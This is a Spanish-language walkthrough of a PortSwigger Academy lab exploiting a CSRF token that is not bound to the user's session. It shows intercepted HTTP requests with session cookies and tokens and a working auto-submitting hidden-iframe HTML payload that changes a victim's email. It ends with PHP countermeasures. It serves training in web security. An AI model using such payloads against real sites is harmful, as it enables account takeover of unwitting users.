# PortSwigger Lab: CSRF where token is not tied to user session

**Plataforma:** PortSwigger Web Security Academy  
**Dificultad:** Fácil  
**Tipo:** CSRF (Cross-Site Request Forgery)  
**Objetivo:** Cambiar email usando token CSRF válido no ligado a sesión

---

## Flujo del ataque

```
Login en dos cuentas → Interceptar peticiones POST en Burp
→ Capturar tokens CSRF (wiener + carlos)
→ Probar intercambio de tokens entre cuentas → Funciona
→ Generar token válido para payload
→ Crear payload HTML con token + email
→ Desplegar en exploit server
→ Enviar a víctima → Email cambiado
```

---

## 1. Acceso al laboratorio

### Dos cuentas disponibles

```
Cuenta 1: wiener:peter
Cuenta 2: carlos:montoya
```

Usar ventanas/pestañas diferentes para ambas sesiones.

---

## 2. Análisis de la vulnerabilidad

### Captura — Cuenta wiener

```http
POST /my-account/change-email HTTP/2
Host: 0a4b001304021a4881399dd000d000c1.web-security-academy.net
Cookie: session=RuzplKEPvSRPQxpt5kmcnzRCnJN1jhZ1
Content-Type: application/x-www-form-urlencoded

email=wiener@test.com&csrf=N57bdEoJvMZGwxgDaMvyFgMNrXPFquRe
```

Token CSRF wiener: `N57bdEoJvMZGwxgDaMvyFgMNrXPFquRe`

### Captura — Cuenta carlos

```http
POST /my-account/change-email HTTP/2
Cookie: session=OtherSessionCookie123456789
Content-Type: application/x-www-form-urlencoded

email=carlos@test.com&csrf=QKGjlIrSAhcCecErmcorXJgwHmdIwQDF
```

Token CSRF carlos: `QKGjlIrSAhcCecErmcorXJgwHmdIwQDF`

---

## Descubrimiento crítico: Token global

### Prueba 1: Token de carlos en sesión de wiener

```http
POST /my-account/change-email HTTP/2
Cookie: session=RuzplKEPvSRPQxpt5kmcnzRCnJN1jhZ1

email=wiener@test.com&csrf=QKGjlIrSAhcCecErmcorXJgwHmdIwQDF
```

**Resultado:** `302 Found` — email se cambia correctamente.

### Prueba 2: Token de wiener en sesión de carlos

```http
POST /my-account/change-email HTTP/2
Cookie: session=OtherSessionCookie123456789

email=carlos@test.com&csrf=N57bdEoJvMZGwxgDaMvyFgMNrXPFquRe
```

**Resultado:** `302 Found` — email se cambia correctamente.

---

## Vulnerabilidad identificada

El token CSRF es válido **globalmente** — no está ligado a sesión específica. Cualquier token válido funciona con cualquier sesión.

| Aspecto | Impacto |
|--------|---------|
| Token global | Válido en cualquier sesión |
| Reutilizable | Un token capturado funciona siempre |
| No personalizado | No vinculado a cookie de sesión |
| CSRF trivial | Solo necesitas un token válido capturado |

---

## 3. Obtención de token válido

### Interceptar sin enviar

1. Sesión iniciada en `/my-account`
2. Burp Suite interceptando
3. Cambiar email **sin enviarlo**
4. **Pausar intercepción** antes de enviar
5. Copiar el token: `csrf=QKGjlIrSAhcCecErmcorXJgwHmdIwQDF`
6. **Drop** la petición (no enviar)

El token capturado es válido pero no fue procesado por el servidor.

---

## 4. Crafting del payload CSRF

Usar token válido capturado en el payload:

```html
<html>
  <body>
    <iframe style="display:none" name="csrfframe"></iframe>
    <form method="POST" 
          action="https://0a4b001304021a4881399dd000d000c1.web-security-academy.net/my-account/change-email" 
          id="csrfform" 
          target="csrfframe">
      <input type="hidden" name="email" value="hacked@attacker.com" />
      <input type="hidden" name="csrf" value="QKGjlIrSAhcCecErmcorXJgwHmdIwQDF" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Puntos clave:**

- `email` = email malicioso (debe ser único)
- `csrf` = token válido capturado (no importa de qué cuenta)
- Iframe oculto para no alertar a la víctima
- Auto-envío con JavaScript

---

## 5. Despliegue en exploit server

1. Ir a exploit server
2. Pegar payload en Body
3. Click Store
4. Click View exploit (verifica funcionamiento)
5. Click Deliver exploit to victim

Resultado: Email de víctima cambiado.

---

## Comparación de los tres labs

| Lab | Token | Ligado a sesión | Bypass |
|-----|-------|---|---|
| 1: No defenses | No | N/A | Directo |
| 2: Token condicional | Sí | Sí | Eliminar parámetro |
| 3: Token no ligado | Sí | **No** | Usar token global válido |

---

## Por qué funciona

| Factor | Razón |
|--------|-------|
| Token global | Validado contra lista de tokens válidos |
| Sin vinculación | No verifica relación con sesión |
| Reutilizable | Token capturado funciona siempre |
| Cookie automática | Víctima adjunta su sesión |
| Validación incompleta | Solo verifica existencia, no pertenencia |

---

## Contramedidas correctas

```php
// CORRECTO: Token único POR SESIÓN
session_start();
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Validar coincidencia con sesión
if ($_POST['csrf'] !== $_SESSION['csrf_token']) {
    die("Invalid CSRF token");
}

// INCORRECTO (lab actual): Token global
if (!in_array($_POST['csrf'], $valid_tokens_table)) {
    die("Invalid CSRF token");
}
```

---

## Referencias

- [PortSwigger — CSRF tokens](https://portswigger.net/web-security/csrf#tokens)
- [OWASP — CSRF Prevention](https://owasp.org/www-community/attacks/csrf)
- [PortSwigger Academy](https://portswigger.net/web-security/lab)
